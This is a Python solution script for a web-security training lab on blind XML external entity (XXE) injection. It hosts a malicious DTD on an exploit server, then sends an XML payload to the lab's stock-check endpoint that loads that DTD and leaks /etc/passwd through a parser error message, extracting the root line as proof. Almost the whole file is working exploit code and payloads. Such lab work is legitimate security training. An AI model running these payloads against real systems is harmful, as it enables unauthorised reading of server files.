#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 16/10/2023
#
# Lab: Exploiting blind XXE to retrieve data via error messages
#
# Steps: 1. Store the malicious DTD file in your exploit server
#        2. Inject payload into the XML-based check stock request to retrieve the
#           content of /etc/passwd via error message
#        3. Extract the first line as a proof
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0a0f00f00471a77e80c4c18200f5002a.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0a53003904bca73c809bc029010c0075.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8"

# the name of the your malicious file
# you can change this to what you want
malicious_file_name = "exploit.dtd"

# the content of the malicious DTD file
malicious_file = f"""<!ENTITY % file SYSTEM "file:///etc/passwd">
                        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file:///notexist/%file;'>">
                        %eval;
                        %exfiltrate;"""
    

# data to send via POST
data = {
    "formAction": "STORE",
    "urlIsHttps": "on",
    "responseFile": f"/{malicious_file_name}",
    "responseHead": exploit_server_head,
    "responseBody": malicious_file,
}

print(Fore.BLUE + "âŸª#âŸ« Injection point: " + Fore.YELLOW + "XML-based check stock request")

try:
    # store your malicious DTD file on your exploit server
    injection = requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to store your malicious DTD file on your exploit server through exception")
    exit(1)

print(Fore.WHITE + "â¦—1â¦˜ Storing the malicious DTD file on your exploit server.. " + Fore.GREEN + "OK")


# payload to retrieve the content of /etc/passwd via error message
payload = f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{exploit_server_url}/{malicious_file_name}"> %xxe; ]>
            <stockCheck>
                <productId>
                    2
                </productId>
                <storeId>
                    1
                </storeId>external entities
                external entities
            </stockCheck>"""

# set content-type header
headers = {
    "Content-Type": "application/xml"
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{lab_url}/product/stock", data=payload, headers=headers)

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "â¦—2â¦˜ Injecting payload to retrieve the content of /etc/passwd via error message.. " + Fore.GREEN + "OK")

# extract the first line of /etc/passwd
first_line = re.findall("/(root:.*)\n", injection.text)[0]

print(Fore.WHITE + "â¦—3â¦˜ Extracting the first line as a proof.. " +  Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + first_line)
print(Fore.WHITE + "ðŸ—¹ Check your browser, it should be marked now as " + Fore.GREEN + "solved")



